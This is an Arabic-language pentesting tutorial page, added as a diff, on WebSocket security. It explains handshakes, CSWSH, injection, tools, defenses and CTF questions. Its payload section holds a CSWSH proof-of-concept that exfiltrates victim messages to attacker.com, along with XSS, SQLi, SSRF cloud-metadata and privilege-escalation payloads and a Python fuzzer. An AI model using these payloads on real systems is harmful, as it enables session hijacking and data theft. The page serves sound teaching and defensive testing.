@@ -1,0 +1,386 @@
+<div class="meth-content-view" id="meth-content-websocket_sec" style="display: none; --tool-color: #a855f7;">
+
+  <!-- Section 1: 🎯 Hero -->
+  <section class="cyber-hero" dir="rtl">
+    <h2 class="hero-title">اختبار أمان WebSockets (WebSocket Security Testing)</h2>
+    <p class="hero-tagline">
+      بروتوكول WebSockets يوفر اتصالاً ثنائي الاتجاه (Bi-directional) ومتزامناً (Full-duplex) عبر اتصال TCP واحد طويل الأمد. نظراً لأن هذا البروتوكول يختلف جذرياً عن بروتوكول HTTP التقليدي من حيث إدارة الجلسات ونقل البيانات، فإنه يفتح المجال واسعاً لهجمات معقدة مثل CSWSH (اختطاف جلسات WebSocket عبر المواقع) وثغرات الحقن (XSS, SQLi) عبر الرسائل المتبادلة.
+    </p>
+    <div class="badges-container">
+      <span class="badge badge-tool">CSWSH</span>
+      <span class="badge badge-info">CVSS: 7.5 - 9.8</span>
+      <span class="badge badge-tool">ws:// / wss://</span>
+      <span class="badge badge-info">Real-time Apps</span>
+    </div>
+  </section>
+
+  <!-- Section 2: 📚 Theory Deep-Dive -->
+  <section class="theory-deep-dive">
+    <div class="card-header">
+      <h3 dir="rtl">📚 الغوص العميق في النظرية (Theory Deep-Dive)</h3>
+    </div>
+    
+    <div class="cyber-card" dir="rtl">
+      <h4>كيفية عمل بروتوكول WebSocket (HTTP Upgrade Handshake)</h4>
+      <p>
+        يبدأ اتصال WebSocket كطلب HTTP عادي، لكنه يحتوي على ترويسات (Headers) خاصة تطلب من الخادم ترقية الاتصال (Upgrade) من HTTP إلى WebSocket. إذا وافق الخادم، يرد برمز الحالة <strong>101 Switching Protocols</strong>.
+      </p>
+      <ul>
+        <li><strong>ws://</strong> غير مشفر (يماثل HTTP). يعمل عادة على المنفذ 80.</li>
+        <li><strong>wss://</strong> مشفر باستخدام TLS (يماثل HTTPS). يعمل عادة على المنفذ 443.</li>
+      </ul>
+      <p>يتم استخدام ترويسة <code>Sec-WebSocket-Key</code> للتأكد من أن الخادم يفهم بروتوكول WebSocket ويمنع عمليات التخزين المؤقت (Caching) الخاطئة.</p>
+    </div>
+
+    <div class="cyber-card" dir="rtl">
+      <h4>مفهوم التأكد من المصدر (Origin Checking) والمصادقة (Authentication)</h4>
+      <p>
+        على عكس طلبات AJAX/CORS في HTTP، لا تقوم متصفحات الويب بتقييد اتصالات WebSocket بسياسة نفس المصدر (Same-Origin Policy). يتم إرسال ترويسة <code>Origin</code> مع طلب الاتصال المبدئي، وتقع مسؤولية التحقق من هذا المصدر على عاتق <strong>الخادم (Server)</strong>. إذا لم يتحقق الخادم من صحة المصدر، يمكن لأي موقع خبيث فتح اتصال WebSocket مع خادم التطبيق باستخدام جلسة الضحية (ملفات تعريف الارتباط أو Cookies تُرسل تلقائياً).
+      </p>
+      <p>
+        بالنسبة للمصادقة، يمكن أن تتم إما عبر Cookies أثناء طلب Handshake، أو كأول رسالة يتم إرسالها عبر الـ WebSocket (مثل إرسال JWT Token داخل رسالة JSON). 
+      </p>
+    </div>
+
+    <div class="cyber-card" dir="rtl">
+      <h4>هيكل إطار البيانات (WebSocket Frame Structure)</h4>
+      <p>
+        تتم تجزئة البيانات المرسلة عبر WebSocket إلى أطر (Frames). كل إطار يحتوي على Opcode يحدد نوع البيانات (0x1 للنصوص، 0x2 للبيانات الثنائية، 0x8 للإغلاق، 0x9 لـ Ping، 0xA لـ Pong). يتم عمل Masking للبيانات المرسلة من العميل إلى الخادم لتجنب هجمات التسمم عبر وسيط التخزين (Cache Poisoning).
+      </p>
+    </div>
+  </section>
+
+  <!-- Section 3: 🔬 Attack Anatomy -->
+  <section class="attack-anatomy">
+    <div class="card-header">
+      <h3 dir="rtl">🔬 تشريح الهجوم (Attack Anatomy) - هجوم CSWSH</h3>
+    </div>
+    
+    <div class="cyber-card" dir="rtl">
+      <p>
+        هجوم اختطاف جلسات WebSockets عبر المواقع (Cross-Site WebSocket Hijacking - CSWSH) هو المكافئ لهجمات CSRF في عالم WebSockets ولكنه أخطر، لأنه يسمح للمهاجم بقراءة الرسائل (Two-way) وليس فقط إرسالها (One-way).
+      </p>
+      <details>
+        <summary><strong>الخطوات التفصيلية للهجوم:</strong></summary>
+        <ol>
+          <li><strong>الخطوة 1:</strong> يقوم المهاجم بإنشاء صفحة ويب خبيثة (Attacker Page) تحتوي على كود JavaScript للاتصال بخادم WebSocket الخاص بالتطبيق الهدف <code>wss://target.com/chat</code>.</li>
+          <li><strong>الخطوة 2:</strong> يخدع المهاجم الضحية لزيارة هذه الصفحة الخبيثة. الضحية مسجلة الدخول بالفعل في الموقع الهدف (تملك Session Cookies نشطة).</li>
+          <li><strong>الخطوة 3:</strong> ينفذ متصفح الضحية كود المهاجم ويفتح اتصال WebSocket. نظراً لأنه يتم إرسال الـ Cookies تلقائياً في طلب الـ Handshake المبدئي، يتم المصادقة على الاتصال بنجاح.</li>
+          <li><strong>الخطوة 4:</strong> الموقع الهدف لا يتحقق من ترويسة <code>Origin</code> القادمة من موقع المهاجم، ويقبل الاتصال.</li>
+          <li><strong>الخطوة 5:</strong> يستطيع كود المهاجم الآن إرسال واستقبال الرسائل نيابة عن الضحية. يمكن للمهاجم إرسال طلب استرجاع البيانات الحساسة أو الرسائل الخاصة، ثم يقوم بإعادة إرسالها (Exfiltration) إلى خادمه الخاص (Attacker Server).</li>
+        </ol>
+      </details>
+    </div>
+    
+    <div class="cyber-card" dir="rtl">
+      <h4>هجمات حقن البيانات (Injection Attacks via WebSockets)</h4>
+      <p>
+        إذا كانت البيانات المرسلة عبر رسائل WebSockets لا يتم تعقيمها (Sanitization)، يمكن استغلالها لتنفيذ هجمات مثل:
+      </p>
+      <ul>
+        <li><strong>XSS (Cross-Site Scripting):</strong> إرسال حمولات خبيثة ليتم تنفيذها في متصفحات المستخدمين الآخرين المتصلين بنفس غرفة الدردشة.</li>
+        <li><strong>SQL Injection:</strong> إذا كان الخادم يستخدم محتوى الرسالة للاستعلام من قاعدة البيانات مباشرة بدون Prepared Statements.</li>
+        <li><strong>SSRF (Server-Side Request Forgery):</strong> إذا كان يمكن إرسال رسالة تطلب من الخادم جلب بيانات من عنوان داخلي.</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- Section 4: ⚡ Payloads Arsenal -->
+  <section class="payloads-arsenal">
+    <div class="card-header">
+      <h3 dir="rtl">⚡ ترسانة الحمولات (Payloads Arsenal)</h3>
+    </div>
+    
+    <div class="cyber-card">
+      <h4 dir="rtl">حمولة استغلال CSWSH (CSWSH PoC Exploit)</h4>
+      <p dir="rtl">كود HTML/JS يتم استضافته على موقع المهاجم لفتح اتصال، وقراءة الرسائل، ثم إرسالها للمهاجم.</p>
+      <div class="cmd-ui-box">
+<pre><code>&lt;!-- index.html hosted on attacker.com --&gt;
+&lt;script&gt;
+  // Initialize WebSocket connection to target
+  var ws = new WebSocket('wss://target-app.com/ws-endpoint');
+  
+  ws.onopen = function() {
+    // Send a message asking for sensitive data or simply wait if data is pushed automatically
+    ws.send('{"action":"get_user_info"}');
+  };
+  
+  ws.onmessage = function(event) {
+    // Exfiltrate the received message to attacker's server
+    var exfilData = encodeURIComponent(event.data);
+    fetch('https://attacker.com/exfiltrate?data=' + exfilData);
+  };
+&lt;/script&gt;</code></pre>
+        <button class="copy-btn" onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)">📋 Copy</button>
+      </div>
+    </div>
+
+    <div class="cyber-card">
+      <h4 dir="rtl">حمولات حقن رسائل WebSockets (Injection Payloads)</h4>
+      <p dir="rtl">رسائل JSON يمكن إرسالها لاختبار وجود ثغرات في معالجة البيانات.</p>
+      <div class="cmd-ui-box">
+<pre><code>// XSS Payload (Testing if messages are reflected without escaping)
+{"type":"chat", "message":"&lt;img src=x onerror=alert(document.domain)&gt;"}
+
+// SQL Injection Payload (Testing JSON fields)
+{"type":"search", "query":"' OR 1=1--"}
+{"type":"search", "query":"'; WAITFOR DELAY '0:0:5'--"}
+
+// SSRF Payload (Testing if WebSocket triggers backend fetch)
+{"type":"webhook_setup", "url":"http://169.254.169.254/latest/meta-data/"}
+
+// Message Manipulation / Privilege Escalation
+{"user_id": 1234, "role": "admin", "action": "delete_user"}</code></pre>
+        <button class="copy-btn" onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)">📋 Copy</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- Section 5: 🛠️ Tools Matrix -->
+  <section class="tools-matrix">
+    <div class="card-header">
+      <h3 dir="rtl">🛠️ مصفوفة الأدوات (Tools Matrix)</h3>
+    </div>
+    <div class="cyber-card">
+      <table class="cyber-table">
+        <thead>
+          <tr>
+            <th>Tool Name</th>
+            <th>Type</th>
+            <th>Best For</th>
+            <th>Key Features</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>Burp Suite (WebSockets Tab)</strong></td>
+            <td>Proxy / Interceptor</td>
+            <td>Manual Testing &amp; Interception</td>
+            <td>Interception of Handshake &amp; Frames, Repeater for WS, CSWSH PoC generation.</td>
+          </tr>
+          <tr>
+            <td><strong>wscat</strong></td>
+            <td>CLI Client</td>
+            <td>Quick CLI interactions</td>
+            <td>Node.js tool, connects quickly to WS, supports headers &amp; subprotocols.</td>
+          </tr>
+          <tr>
+            <td><strong>websocat</strong></td>
+            <td>CLI Client / Swiss Army Knife</td>
+            <td>Automation &amp; Piping</td>
+            <td>Rust tool, pipes bash commands to WS, proxy support, advanced routing.</td>
+          </tr>
+          <tr>
+            <td><strong>WSSiP</strong></td>
+            <td>Specialized Proxy</td>
+            <td>Fuzzing &amp; Automation</td>
+            <td>Python-based UI/CLI, scriptable message generation, designed specifically for WS pentesting.</td>
+          </tr>
+          <tr>
+            <td><strong>python-websocket-client</strong></td>
+            <td>Library</td>
+            <td>Custom Exploit Scripts</td>
+            <td>Writing customized multi-step Python exploits for complex WS APIs.</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- Section 6: 📋 Commands Playbook -->
+  <section class="commands-playbook">
+    <div class="card-header">
+      <h3 dir="rtl">📋 دليل الأوامر (Commands Playbook)</h3>
+    </div>
+
+    <div class="cyber-card" dir="rtl">
+      <h4>الاتصال الأساسي واختبار الردود</h4>
+      <p>استخدام <code>wscat</code> للاتصال المباشر وتمرير الترويسات لمحاكاة الجلسة.</p>
+      <div class="cmd-ui-box">
+<pre><code># Install wscat using npm
+npm install -g wscat
+
+# Connect with a specific Origin and Cookie
+wscat -c wss://target.com/ws -H "Origin: https://target.com" -H "Cookie: session=123XYZ"
+
+# Once connected, type messages to send:
+> {"action":"ping"}
+< {"action":"pong"}</code></pre>
+        <button class="copy-btn" onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)">📋 Copy</button>
+      </div>
+    </div>
+
+    <div class="cyber-card" dir="rtl">
+      <h4>استخدام websocat للتوجيه والتلقائية</h4>
+      <p>أداة قوية للغاية لاختبار ثغرات WebSockets باستخدام سكربتات bash.</p>
+      <div class="cmd-ui-box">
+<pre><code># Simple connection
+websocat wss://target.com/ws
+
+# Connect ignoring TLS errors (insecure)
+websocat --insecure wss://target.com/ws
+
+# Read payloads from a file and send them line by line
+websocat wss://target.com/ws < payloads.txt
+
+# Pipe commands into websocket and see response
+echo '{"query":"admin"}' | websocat wss://target.com/ws</code></pre>
+        <button class="copy-btn" onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)">📋 Copy</button>
+      </div>
+    </div>
+
+    <div class="cyber-card" dir="rtl">
+      <h4>سكربت Python للاتصال المخصص (Custom Fuzzer)</h4>
+      <p>مثال لكيفية كتابة سكربت Python بسيط للتواصل التلقائي وإرسال الحمولات.</p>
+      <div class="cmd-ui-box">
+<pre><code>import websocket
+import json
+
+def on_message(ws, message):
+    print(f"Received: {message}")
+
+def on_error(ws, error):
+    print(f"Error: {error}")
+
+def on_close(ws, close_status_code, close_msg):
+    print("Connection closed")
+
+def on_open(ws):
+    print("Connection opened!")
+    # Send a malicious payload
+    payload = {"type":"chat", "msg":"<script>alert(1)</script>"}
+    ws.send(json.dumps(payload))
+
+if __name__ == "__main__":
+    headers = ["Origin: https://target.com", "Cookie: session_id=12345"]
+    ws = websocket.WebSocketApp("wss://target.com/chat",
+                              header=headers,
+                              on_open=on_open,
+                              on_message=on_message,
+                              on_error=on_error,
+                              on_close=on_close)
+    ws.run_forever()</code></pre>
+        <button class="copy-btn" onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)">📋 Copy</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- Section 7: 🏆 Real-World Cases -->
+  <section class="real-world-cases">
+    <div class="card-header">
+      <h3 dir="rtl">🏆 دراسات حالة حقيقية (Real-World Cases)</h3>
+    </div>
+    
+    <div class="cyber-card" dir="rtl">
+      <h4>1. حالة PortSwigger: اختطاف جلسة الدردشة (CSWSH)</h4>
+      <p>
+        <strong>السيناريو:</strong> تطبيق دردشة مبني على WebSockets لم يتحقق من ترويسة <code>Origin</code> أو يطلب Tokens ضمن رسائل الاتصال.
+        <strong>الاستغلال:</strong> استخدم المهاجم صفحة ويب خارجية تقوم بالاتصال بـ <code>wss://chat.app/ws</code> وتعتمد على Session Cookies الموجودة في المتصفح. عند فتح الاتصال بنجاح، يرسل المهاجم رسالة <code>{"type":"READY"}</code> ويقوم الخادم بالرد بسجل محادثات الضحية (Chat History). تم تسريب هذه الرسائل لخادم المهاجم.
+      </p>
+    </div>
+
+    <div class="cyber-card" dir="rtl">
+      <h4>2. تقرير HackerOne: ثغرة XSS مخزنة عبر WebSockets في تطبيق تداول</h4>
+      <p>
+        <strong>السيناريو:</strong> تطبيق لتداول الأسهم يسمح للمستخدمين بترك تعليقات تظهر في الوقت الفعلي للمتداولين الآخرين.
+        <strong>الاستغلال:</strong> يتم نقل الرسائل عبر WebSockets بتنسيق JSON. اكتشف الباحث الأمني أن الخادم لا يقوم بتعقيم البيانات (Sanitization). قام المشتري بفتح اتصال WebSocket وإرسال رسالة: <code>{"msg":"&lt;img src=x onerror=alert(document.cookie)&gt;"}</code>. تم عكس هذه الرسالة وبثها لجميع المتداولين المتصلين حالياً، مما أدى لثغرة XSS قوية أثرت على المئات في نفس اللحظة.
+      </p>
+    </div>
+  </section>
+
+  <!-- Section 8: 🛡️ Defense & Remediation -->
+  <section class="defense-remediation">
+    <div class="card-header">
+      <h3 dir="rtl">🛡️ الدفاع والمعالجة (Defense & Remediation)</h3>
+    </div>
+    
+    <div class="cyber-card" dir="rtl">
+      <h4>1. التحقق الصارم من ترويسة Origin (Strict Origin Validation)</h4>
+      <p>
+        يجب على الخادم أن يتحقق من ترويسة <code>Origin</code> أثناء طلب الـ Handshake ويرفض الاتصال إذا كان المصدر غير موثوق. 
+        <em>ملاحظة:</em> يمكن تزوير الـ Origin في برامج مخصصة، ولكن المتصفحات تمنع تعديل هذه الترويسة بواسطة جافا سكريبت، مما يحمي المستخدمين من هجمات CSWSH.
+      </p>
+    </div>
+
+    <div class="cyber-card" dir="rtl">
+      <h4>2. استخدام التوكنز للمصادقة (Tokens for Authentication)</h4>
+      <p>
+        لا تعتمد على Cookies فقط. اطلب إرسال CSRF Token أو JWT إما كمعامل في الـ URL أثناء الاتصال <code>wss://app.com/ws?token=123</code>، أو كأول رسالة يتم تبادلها عبر الاتصال قبل السماح بأي عمليات أخرى.
+      </p>
+    </div>
+
+    <div class="cyber-card" dir="rtl">
+      <h4>3. استخدام WSS دائماً (Enforce WSS)</h4>
+      <p>
+        تأكد من تشفير جميع اتصالات WebSockets باستخدام <code>wss://</code> لمنع هجمات التجسس (Man-in-the-Middle) على مستوى الشبكة.
+      </p>
+    </div>
+
+    <div class="cyber-card" dir="rtl">
+      <h4>4. تعقيم البيانات والحد من الحجم (Sanitization & Rate Limiting)</h4>
+      <p>
+        تعامل مع البيانات القادمة من WebSockets على أنها غير موثوقة (Untrusted User Input) تماماً مثل مدخلات HTTP:
+      </p>
+      <ul>
+        <li>قم بتعقيم الرسائل لتجنب XSS و SQLi.</li>
+        <li>ضع حدوداً (Rate Limiting) على عدد وحجم الرسائل المرسلة لمنع هجمات حجب الخدمة (DoS).</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- Section 9: 🧪 CTF Challenge -->
+  <section class="ctf-challenge">
+    <div class="card-header">
+      <h3 dir="rtl">🧪 تحديات CTF (CTF Challenge)</h3>
+    </div>
+    <div class="cyber-card" dir="rtl">
+      <p>اختبر معلوماتك في سيناريوهات اختبار اختراق WebSockets:</p>
+      
+      <details>
+        <summary><strong>السؤال 1:</strong> أثناء اختبار تطبيق يستخدم WebSockets، لاحظت أن الاتصال ينجح حتى لو قمت بتغيير ترويسة Origin إلى موقعك، ويتم المصادقة عبر ملفات تعريف الارتباط. ما هو الهجوم المحتمل هنا؟</summary>
+        <div class="answer" style="margin-top: 10px; padding: 10px; border-left: 3px solid var(--tool-color); background: rgba(0,0,0,0.2);">
+          <strong>الإجابة:</strong> هجوم اختطاف جلسة WebSocket عبر المواقع (CSWSH). يمكن للمهاجم بناء صفحة خبيثة تقرأ وترسل البيانات نيابة عن الضحية.
+        </div>
+      </details>
+
+      <details>
+        <summary><strong>السؤال 2:</strong> لماذا يعتبر الاعتماد الكلي على معالجة الـ XSS في واجهة الويب (Client-Side) خطيراً في تطبيقات WebSockets للدردشة المباشرة؟</summary>
+        <div class="answer" style="margin-top: 10px; padding: 10px; border-left: 3px solid var(--tool-color); background: rgba(0,0,0,0.2);">
+          <strong>الإجابة:</strong> لأن المهاجم يمكنه الاتصال بالخادم مباشرة باستخدام أدوات مثل wscat (متجاوزاً واجهة الويب)، وإرسال حمولة خبيثة إلى الخادم، والذي سيقوم ببثها (Broadcast) لجميع المتصلين، ليتم تنفيذها على متصفحاتهم. يجب على الخادم نفسه التحقق من المحتوى (Server-Side Sanitization).
+        </div>
+      </details>
+
+      <details>
+        <summary><strong>السؤال 3:</strong> كيف تقوم باختراض ثغرات SQL Injection عبر رسائل WebSockets؟</summary>
+        <div class="answer" style="margin-top: 10px; padding: 10px; border-left: 3px solid var(--tool-color); background: rgba(0,0,0,0.2);">
+          <strong>الإجابة:</strong> عن طريق اعتراض الإطارات (Frames) باستخدام Burp Suite، أو استخدام wscat، ثم تعديل قيم الحقول المرسلة في JSON بحمولات SQLi قياسية (مثل <code>' OR 1=1--</code>) ومراقبة أخطاء قاعدة البيانات أو الاستجابات غير الطبيعية.
+        </div>
+      </details>
+    </div>
+  </section>
+
+  <!-- Section 10: 📖 Cheat Sheet -->
+  <section class="cheat-sheet">
+    <div class="card-header">
+      <h3 dir="rtl">📖 ورقة المرجعية (Cheat Sheet)</h3>
+    </div>
+    <div class="cyber-card" dir="rtl">
+      <h4>أدوات واختصارات هامة</h4>
+      <ul>
+        <li><strong>Burp Suite Interception:</strong> انتقل إلى <em>Proxy > WebSockets history</em> لمشاهدة جميع الرسائل. يمكنك استخدام <em>Send to Repeater</em> لتعديل الإطارات وإعادة إرسالها.</li>
+        <li><strong>wscat connection:</strong> <code>wscat -c wss://site.com/ws -H "Origin: https://site.com"</code></li>
+        <li><strong>wscat Ignore SSL:</strong> <code>wscat -n -c wss://site.com/ws</code></li>
+        <li><strong>websocat piping:</strong> <code>cat payloads.txt | websocat wss://site.com/ws</code></li>
+      </ul>
+      <h4>قائمة التحقق الأمني لـ WebSockets (Pentesting Checklist)</h4>
+      <ol>
+        <li>هل يتم استخدام <code>wss://</code> وليس <code>ws://</code>؟</li>
+        <li>هل يتحقق الخادم من ترويسة <code>Origin</code> لحماية ضد CSWSH؟</li>
+        <li>هل توجد آلية مصادقة قوية غير الـ Cookies المعتادة (مثل CSRF Tokens أو JWTs في الرسائل الأولى)؟</li>
+        <li>هل يتم تعقيم البيانات المرسلة من العميل قبل معالجتها وبثها (XSS/SQLi)؟</li>
+        <li>هل يضع الخادم قيوداً على معدل وحجم الرسائل (Rate/Size Limits)؟</li>
+      </ol>
+    </div>
+  </section>
+
+</div>
